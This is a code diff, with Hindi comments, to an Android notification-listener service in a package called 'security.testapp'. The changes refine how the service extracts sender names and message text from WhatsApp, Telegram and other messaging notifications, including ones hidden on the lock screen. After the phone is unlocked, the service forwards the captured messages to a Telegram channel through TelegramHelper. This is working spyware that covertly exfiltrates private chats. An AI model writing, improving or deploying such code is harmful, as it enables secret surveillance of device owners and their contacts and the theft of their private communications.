@@ -2,6 +2,7 @@ package com.security.testapp
 
 import android.app.Notification
 import android.os.Build
+import android.os.Bundle
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import java.util.Collections
@@ -33,19 +34,21 @@ class NotificationListener : NotificationListenerService() {
             val packageName = sbn.packageName
             val notification = sbn.notification
 
-            // 1. MessagingStyle से सारे मैसेज निकालें (WhatsApp, Telegram, आदि)
-            val messages = extractMessagesFromNotification(notification)
+            // 1. MessagingStyle से मैसेज निकालें (WhatsApp, Telegram, आदि)
+            val messages = extractMessages(notification)
 
-            // 2. मैसेज बनाएँ
+            // 2. फ़ाइनल मैसेज स्ट्रिंग बनाएँ
             val finalMessage = if (messages.isNotEmpty()) {
                 messages.joinToString("\n") { msg ->
-                    val sender = msg.sender?.toString() ?: "Unknown"
-                    val text = msg.text?.toString() ?: ""
+                    val sender = msg.sender ?: "Unknown"
+                    val text = msg.text ?: ""
                     "👤 $sender: $text"
                 }
             } else {
                 // अगर MessagingStyle नहीं है तो पुराने तरीके से टेक्स्ट निकालें
-                val extras = if (notification.visibility == Notification.VISIBILITY_PRIVATE && notification.publicVersion != null) {
+                val extras = if (notification.visibility == Notification.VISIBILITY_PRIVATE &&
+                    notification.publicVersion != null
+                ) {
                     notification.publicVersion.extras
                 } else {
                     notification.extras
@@ -86,13 +89,31 @@ class NotificationListener : NotificationListenerService() {
         if (sbn != null) hiddenKeys.remove(sbn.key)
     }
 
-    /** Notification से MessagingStyle के messages निकालें (WhatsApp, आदि के लिए) */
-    private fun extractMessagesFromNotification(notification: Notification): List<Notification.MessagingStyle.Message> {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-            val messagingStyle = Notification.MessagingStyle.extractMessagingStyleFromNotification(notification)
-            return messagingStyle?.messages ?: emptyList()
+    /** Notification से सीधे MessagingStyle के मैसेज निकालें (बिना extractMessagingStyleFromNotification) */
+    private fun extractMessages(notification: Notification): List<MessageData> {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return emptyList()
+
+        val extras = notification.extras
+        if (extras == null) return emptyList()
+
+        // Android 7+ पर "android.messages" key में ArrayList<Bundle> होता है
+        val messagesArray = extras.getParcelableArrayList<Bundle>(Notification.EXTRA_MESSAGES)
+        if (messagesArray.isNullOrEmpty()) return emptyList()
+
+        val result = mutableListOf<MessageData>()
+        for (bundle in messagesArray) {
+            val text = bundle.getString("text") ?: ""
+            // sender एक Person ऑब्जेक्ट हो सकता है, लेकिन हम सिर्फ नाम/डिस्प्ले नाम लेंगे
+            val senderPerson = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                bundle.getParcelable("sender_person", android.app.Person::class.java)
+            } else {
+                @Suppress("DEPRECATION")
+                bundle.getParcelable("sender")
+            }
+            val senderName = senderPerson?.name?.toString() ?: "Unknown"
+            result.add(MessageData(senderName, text))
         }
-        return emptyList()
+        return result
     }
 
     fun onUnlock() {
@@ -101,16 +122,19 @@ class NotificationListener : NotificationListenerService() {
             if (hiddenKeys.remove(sbn.key)) {
                 try {
                     val notification = sbn.notification
-                    val messages = extractMessagesFromNotification(notification)
+                    val messages = extractMessages(notification)
                     val finalMessage = if (messages.isNotEmpty()) {
-                        messages.joinToString("\n") { msg ->
-                            "👤 ${msg.sender}: ${msg.text}"
-                        }
+                        messages.joinToString("\n") { "👤 ${it.sender}: ${it.text}" }
                     } else "[Content Hidden]"
-                    val msg = "<b>🔓 Unlocked Notification</b>\n<b>📦 App:</b> ${sbn.packageName}\n$finalMessage"
+                    val msg =
+                        "<b>🔓 Unlocked Notification</b>\n<b>📦 App:</b> ${sbn.packageName}\n$finalMessage"
                     TelegramHelper.sendWithFallback(msg, this, "HTML")
-                } catch (_: Exception) {}
+                } catch (_: Exception) {
+                }
             }
         }
     }
+
+    /** मैसेज डेटा क्लास */
+    private data class MessageData(val sender: String, val text: String)
 }
